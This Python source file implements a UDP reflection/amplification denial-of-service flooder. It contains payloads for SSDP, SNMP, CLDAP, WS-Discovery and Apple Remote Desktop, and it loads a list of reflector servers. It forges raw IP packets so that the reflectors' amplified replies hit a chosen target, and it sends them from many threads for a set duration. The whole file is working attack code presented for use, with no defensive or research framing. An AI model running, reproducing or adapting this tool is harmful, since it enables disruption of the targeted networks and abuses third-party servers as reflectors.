import socket
import struct
import random
import threading
import time
import ipaddress

PROTOCOLS = {
    "ssdp": {
        "port": 1900,
        "payload": b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n',
        "amplification": 30,
    },
    "snmp": {
        "port": 161,
        "payload": b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x01\x05\x00',
        "amplification": 500,
    },
    "cldap": {
        "port": 389,
        "payload": b'\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00',
        "amplification": 70,
    },
    "wsd": {
        "port": 3702,
        "payload": b'<?xml version="1.0" encoding="UTF-8"?><e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"><e:Body><d:Probe xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"><d:Types/><d:Scopes/></d:Probe></e:Body></e:Envelope>',
        "amplification": 20,
    },
    "ard": {
        "port": 3283,
        "payload": b'\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        "amplification": 50,
    },
}

AMPLIFICATION_SERVERS_FILE = "amp_servers.txt"

class AmplificationFlood:
    def __init__(self, target, port, threads, duration, spoof=False, protocol="ssdp", servers=None):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.protocol = protocol.lower()
        self.stop_event = threading.Event()
        self.server_list = servers if servers else self._load_servers()

    def _load_servers(self):
        try:
            with open(AMPLIFICATION_SERVERS_FILE, "r") as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            return []

    def _checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _build_ip_header(self, src, dst):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 8 + len(self._get_payload())
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(src)
        ip_daddr = socket.inet_aton(dst)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        ip_check = self._checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        return ip_header

    def _get_payload(self):
        proto = PROTOCOLS.get(self.protocol, PROTOCOLS["ssdp"])
        return proto["payload"]

    def _get_target_port(self):
        proto = PROTOCOLS.get(self.protocol, PROTOCOLS["ssdp"])
        return proto["port"]

    def _send_amplified(self, sock, server_ip):
        src_ip = self.target  # spoof source as target
        dst_ip = server_ip
        src_port = random.randint(1024, 65535)
        dst_port = self._get_target_port()
        payload = self._get_payload()

        udp_length = 8 + len(payload)
        udp_checksum = 0
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, udp_checksum)

        ip_header = self._build_ip_header(src_ip, dst_ip)
        packet = ip_header + udp_header + payload
        try:
            sock.sendto(packet, (server_ip, dst_port))
        except Exception:
            pass

    def _attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return

        while not self.stop_event.is_set():
            for server in self.server_list:
                try:
                    self._send_amplified(sock, server)
                except Exception:
                    pass

    def start(self):
        if not self.server_list:
            print(f"[!] Tidak ada server amplification di {AMPLIFICATION_SERVERS_FILE}")
            return

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False, protocol="ssdp", servers=None):
    flood = AmplificationFlood(target, port, threads, duration, spoof, protocol, servers)
    flood.start()
